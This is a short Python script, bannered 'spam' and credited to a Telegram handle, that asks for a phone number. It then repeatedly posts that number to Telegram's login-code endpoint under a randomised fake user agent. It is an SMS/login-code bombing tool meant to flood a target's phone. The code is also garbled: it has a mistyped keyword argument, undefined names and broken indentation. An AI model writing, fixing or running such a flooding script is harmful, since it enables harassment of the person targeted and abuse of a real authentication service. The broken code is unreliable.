import requests, fake_useragent, time

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
NUMBER = input('Beeante HOMep tenedona: (6es +)')
 
console.print('''[bold green]                                                                                          
  ___   _ __     __ _   _ __ ___  
 / __| | '_ \   / _` | | '_ ` _ \ 
 \__ \ | |_) | | (_| | | | | | | |
 |___/ | .__/   \__,_| |_| |_| |_|
       |_|                                                                         
''')
console.print('''[bold red]
 -----------------------------------------        
| Telegram - @Hironotori                  |
 -----------------------------------------
''')
 
while True:
 try:
     response = requests.post('https://my.telegram.org/auth/send_password', headers-headers, data={'phone' : NUMBER})
     print('+')
 except:
     print('=')
 try:
     print('+')
     requests.post("https://my.telegram.org/auth/send_password", headers=headers, data={'phone': "+" + number})
 except:
     print('=')
      try:
     response = requests.post('https://my.telegram.org/auth/send_password', headers-headers, data={'phone' : NUMBER})
     print('+')
 except:
     print('=')
 try:
     response = requests.post('https://my.telegram.org/auth/send_password', headers-headers, data={'phone' : NUMBER})
     print('+')
 except:
     print('=')
     
time.sleep(5)
